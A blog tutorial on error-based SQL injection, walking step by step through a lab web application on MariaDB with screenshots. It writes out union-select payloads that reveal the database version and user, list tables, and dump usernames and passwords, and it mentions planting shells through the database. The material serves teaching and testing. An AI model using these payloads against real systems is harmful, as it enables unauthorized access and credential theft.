---
layout: post
title: SQL Injection
description: >

tags: [SQL Injection]
---

## Error-based SQL Injection

A type of **SQL Injection** attack which is performed based on the errors thrown by the database on the application. An attacker performs "Error-based SQL Injection" by tampering the user input with special characters like ',",\,) etc.On passing these special characters, the input will be placed in the backed SQL Query as it is. Hence, it breaks the syntax of thhe query and the database throws an error with details such as where the syntax broken and the rest of the query etc. These details can be used to extract the contents of the entire database based on the errors by fixing with the correct syntax. An attacker can even include the shells in the database whhich allows to compromise the web server.  
#### SQL Queries to understand

To comment out a query need to use "--+"  
To identify number of columns use "order by 3"  
To combine all the columns and display the content use "union select 1,2,3 --+"  
To dump all the content in a table or column use group_concat() function  
#### Steps to identify and exploit
  Step 1: To identify a vulnerability, need to append some special characters as shown  
  ![](https://raw.githubusercontent.com/n0tak1dd1y/n0tak1dd1y.github.io/master/assets/webapp/error/1.PNG)
  Step 2: Based on the error, we found it is a "MariaDB" database with a syntax error and needs to be fixed. It can be done with a comment tag whichh will ignore thhe rest of the content after this tag as shown below  
  ![](https://raw.githubusercontent.com/n0tak1dd1y/n0tak1dd1y.github.io/master/assets/webapp/error/2.PNG)
  Step 3: Query has been fixed, now we need to identify the number of columns in the database as shown  
  ![](https://raw.githubusercontent.com/n0tak1dd1y/n0tak1dd1y.github.io/master/assets/webapp/error/3.PNG)
  Step 4: As above we have an error since the number of columns can be more or less than 5 columns. So we need to brute forced to identify the number of columns. We can give a try for 3 columns as shown below  
  ![](https://raw.githubusercontent.com/n0tak1dd1y/n0tak1dd1y.github.io/master/assets/webapp/error/4.PNG)
  Step 5: We identified 3 columns in database, lets use "union" to see which value reflects on the screen to dump the data  
  ![](https://raw.githubusercontent.com/n0tak1dd1y/n0tak1dd1y.github.io/master/assets/webapp/error/5.PNG)
  Step 6: As shown above, no value is reflecting the application. Let's give a "Negative" Number to balance both sides to figure out the reflection values  
  ![](https://raw.githubusercontent.com/n0tak1dd1y/n0tak1dd1y.github.io/master/assets/webapp/error/6.PNG)
  Step 7: Successfully identified 2,3 are reflecting to dump data. So, we pass "@@version, user()" to enumerate the database version and the user with the query as "id=1' union select 1,@@version, user() --+" as shown  
  ![](https://raw.githubusercontent.com/n0tak1dd1y/n0tak1dd1y.github.io/master/assets/webapp/error/7.PNG)
  Step 8: Note it has shown the version and the user as intended. Let's enumerate the tables in it with a query as "id=1' union select 1,table_name,3 from information_schema.tables where table_schema=database()--+" as shown  
  ![](https://raw.githubusercontent.com/n0tak1dd1y/n0tak1dd1y.github.io/master/assets/webapp/error/8.PNG)
  Step 9: As we can see the table name is enumerated, lets dump all the tables as "id=1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+" as shown  
  ![](https://raw.githubusercontent.com/n0tak1dd1y/n0tak1dd1y.github.io/master/assets/webapp/error/9.PNG)
  Step 10: In the same way, we can dump all the username, passwords in the users as "id=1' union select 1,group_concat(username), group_concat(password) from users --+"  
  ![](https://raw.githubusercontent.com/n0tak1dd1y/n0tak1dd1y.github.io/master/assets/webapp/error/10.PNG)
  Step 11: In this way, we can dump entire content in the database